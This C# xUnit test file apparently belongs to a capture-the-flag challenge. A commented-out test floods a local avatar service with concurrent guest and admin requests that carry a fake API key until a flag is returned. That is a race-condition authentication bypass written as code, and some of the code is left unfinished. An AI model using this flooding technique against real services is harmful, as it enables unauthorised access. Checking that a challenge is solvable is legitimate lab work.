namespace Mycoverse.Common.Tests.Unit;

using Xunit;
using System;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging.Abstractions;
using Mycoverse.Services.Avatar;
using Mycoverse.Services.Avatar.Options;
using Mycoverse.Net.Options;
using Mycoverse.Common.Cryptography;
using Mycoverse.Common.Options;

using System.IO;
using System.Text;
using System.Linq;
using System.Collections.Generic;

using JsonServer = Mycoverse.Net.Server<Mycoverse.Net.Json.JsonConnection, Mycoverse.Net.Json.JsonRequest, Mycoverse.Net.Json.JsonResponse>;
using System.Threading;
using System.Net.Sockets;
using System.Threading.Tasks;

public class TestFlag3
{
    private ILogger<T> Null<T>() => new NullLogger<T>();
    private static ILogger<TestFlag3>? Log;

    public static MockedOptions<DatabaseOptions> DbOpts = new MockedOptions<DatabaseOptions>(
        new DatabaseOptions
        {
            Path = Path.Combine(Constants.BasePath, "files/chal3/db.sqlite"),
            MaxQuery = 10,
        });

    public static MockedOptions<NetworkOptions> NetOpts = new MockedOptions<NetworkOptions>(new NetworkOptions
    {
        Concurrent = 30,
        Listen = "::1",
        Port = 8882,
        Proto = "tcp",
        Queue = 10
    });

    [Fact]
    public void TestDbInsert()
    {
        
    } 

    public static MockedOptions<CryptographyOptions> CryptoOpts = new MockedOptions<CryptographyOptions>(new CryptographyOptions
    {
        Keyfile = Path.Combine(Constants.BasePath, "files/chal2/cfg/backup.key")
    });

    // [Fact]
    // public void FlagShouldBeObtainable()
    // {
    //     // Manually create the environment
    //     var db = new DatabaseService(Null<DatabaseService>(), DbOpts);
    //     var api = new ApiKeyService(db, Null<ApiKeyService>());
    //     var aes = new AesCipher(CryptoOpts);
    //     var svcProvider = new ServiceCollection()
    //         .AddLogging(x =>
    //         {
    //             x.AddConsole();
    //             x.SetMinimumLevel(LogLevel.Information);
    //         })
    //     .BuildServiceProvider();


    //     Log = svcProvider.GetService<ILogger<TestFlag3>>();

    //     var srv = new JsonServer(NetOpts, Null<JsonServer>(), svcProvider);
    //     var svc = new AvatarService(Null<AvatarService>(), NetOpts, aes, srv, api, new A);

    //     var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));

    //     var loopTask = svc.StartAsync(cts.Token);
    //     loopTask.Wait();

    //     // Create 10 workers that query guest
    //     var guests = new List<Task<string?>>();
    //     var admins = new List<Task<string?>>();
    //     for (var i = 0; i < DbOpts.Value.MaxQuery*2; ++i) guests.Add(Worker(cts, "guest"));
    //     Thread.Sleep(1000);
    //     for (var i = 0; i < 10; ++i) admins.Add(Worker(cts, "admin")); // Create 5 workers that query admin


    //     cts.Token.WaitHandle.WaitOne();

    //     foreach (var t in guests.Concat(admins))
    //     {
    //         if (!t.IsCanceled && t.Result != null)
    //         {
    //             Assert.Contains(t.Result, "FLAG");
    //             return; // Skip the failure
    //         }
    //     }
    //     throw new Exception("Did not retrieve flag in allocated time");

    // }


    private async Task<string?> Worker(CancellationTokenSource cts, string user)
    {
        var k = cts.Token;
        try
        {

            using TcpClient tcpClient = new TcpClient();
            await tcpClient.ConnectAsync("::1", NetOpts.Value.Port);

            var tcp = tcpClient.GetStream();
            var cmd = string.Format("{{\"type\": 1, \"username\": \"{0}\", \"apiKey\": \"NotAnApiKey\" }}", user);

            using var sw = new StreamWriter(tcp, Encoding.UTF8, 4096, leaveOpen: true);
            using var sr = new StreamReader(tcp, Encoding.UTF8, false, 4096, leaveOpen: true);
            while (!k.IsCancellationRequested)
            {
                await sw.WriteLineAsync(cmd);
                var rsp = await sr.ReadLineAsync();
                Log?.LogInformation(rsp);
                if (rsp?.Contains("FLAG") == true)
                {
                    cts.Cancel();
                    return rsp;
                }

            }
        }
        catch
        {
            return null;
        }
        k.ThrowIfCancellationRequested();
        return null;
    }
}